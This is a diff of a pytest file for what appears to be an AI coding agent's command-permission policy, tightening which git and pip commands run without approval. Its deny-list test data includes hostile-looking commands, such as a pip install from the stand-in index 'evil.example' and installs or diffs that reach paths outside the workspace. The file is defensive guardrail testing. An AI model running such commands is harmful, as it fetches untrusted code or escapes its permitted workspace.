@@ -13,7 +13,7 @@ def test_local_grants_are_registered_workspace_tools_only():
     grants = set(policy.local_runtime_tool_grants("workspace_write"))
     assert {"cli_tool", "exec_command", "write_stdin", "read_file_tool",
             "write_file_tool", "apply_diff_edit_tool", "apply_patch_tool",
-            "grep_search_tool", "glob_tool"} == grants
+            "grep_search_tool", "glob_tool", "record_local_reuse_evidence_tool"} == grants
     assert grants <= TOOL_CATALOG.keys()
     assert not grants & {"web_search_tool", "web_fetch_tool", "clean_workspace_debris_tool",
                          "agent_message_tool", "unified_memory_search_tool",
@@ -21,6 +21,8 @@ def test_local_grants_are_registered_workspace_tools_only():
     read_only = set(policy.local_runtime_tool_grants("read_only"))
     assert read_only == {"grep_search_tool", "glob_tool", "read_file_tool"}
     assert external_runtime_tool_grants("workspace_write") == external_before
+    assert "record_local_reuse_evidence_tool" not in external_before
+    assert "record_local_reuse_evidence_tool" not in external_runtime_tool_grants("full_access")
     assert not read_only & {"write_file_tool", "apply_diff_edit_tool", "apply_patch_tool"}
     assert policy.LOCAL_RUNTIME_SOURCE_PREFIX == "launcher_assistant_task:"
     with pytest.raises(ValueError):
@@ -43,7 +45,7 @@ def test_local_grants_are_registered_workspace_tools_only():
     "git status --short", "git diff --stat", "git log -3 --oneline",
     "git -C . --no-pager diff", "git add core/example.py",
     'git commit -m "Implement ordinary development"',
-    "git switch -c codex/example", "git branch codex/example",
+    "git branch --show-current", "git branch --list", "git stash list", "git stash show",
     "git merge --ff-only codex/example",
 ])
 def test_ordinary_development_commands_can_continue(tmp_path, command):
@@ -51,31 +53,37 @@ def test_ordinary_development_commands_can_continue(tmp_path, command):
     assert policy.normal_development_call("cli_tool", {"command": command, "cwd": "."}, tmp_path)
 
 
-@pytest.mark.parametrize("command", [
-    "git stash push -m wip",
-    "git stash push -m wip -- core/example.py",
-    "git stash push core/example.py",
-    "git stash pop",
-    f'"{sys.executable}" -m pip install requests',
-    "python -m pip install -r requirements.txt",
-    "python -m pip install --upgrade --quiet --no-input requests",
-])
-def test_newly_whitelisted_stash_and_pip_install_can_continue(tmp_path, command):
-    assert policy.normal_development_call("exec_command", {"cmd": command}, tmp_path)
-    assert policy.normal_development_call("cli_tool", {"command": command, "cwd": "."}, tmp_path)
+@pytest.mark.parametrize("separator", [" ", " -- "])
+def test_git_diff_does_not_implicitly_compare_a_file_outside_the_task(tmp_path, separator):
+    allowed = {"cmd": "git diff HEAD~1 HEAD -- core/example.py"}
+    outside = {"cmd": f'git diff{separator}core/example.py "{tmp_path.parent / "outside.py"}"'}
+    assert policy.normal_development_call("exec_command", allowed, tmp_path)
+    assert not policy.normal_development_call("exec_command", outside, tmp_path)
+
+
+@pytest.mark.skipif(sys.platform != "win32", reason="Windows device namespace")
+@pytest.mark.parametrize("path", ["NUL", "subdir/NUL.txt", "CON", "COM1"])
+def test_native_file_tool_does_not_grant_win32_device_names(tmp_path, path):
+    assert not policy.workspace_paths_allowed("write_file_tool", {"file_path": path}, tmp_path)
 
 
 @pytest.mark.parametrize("command", [
+    "git switch main", "git switch -c codex/example", "git branch codex/example",
+    "git stash push -m wip -- core/example.py", "git stash pop",
     "git stash drop", "git stash clear", "git stash save wip", "git stash apply",
     "git stash push -p", "git stash push --include-untracked",
     "pip install requests", "pip uninstall requests",
+    f'"{sys.executable}" -m pip install requests',
+    "python -m pip install -r requirements.txt",
+    "python -m pip install --upgrade --quiet --no-input requests",
     "python -m pip uninstall requests",
+    "python scripts/reuse_research_evidence.py record --help",
     "python -m pip install --target C:/Windows/tooling requests",
     "python -m pip install --target ../outside requests",
     "python -m pip install -i https://evil.example/simple requests",
     "python -m pip install -e .",
 ])
-def test_stash_destructive_variants_and_pip_guardrails_keep_approval(tmp_path, command):
+def test_shared_git_mutations_and_package_installation_keep_approval(tmp_path, command):
     assert not policy.normal_development_call("exec_command", {"cmd": command}, tmp_path)
 
 
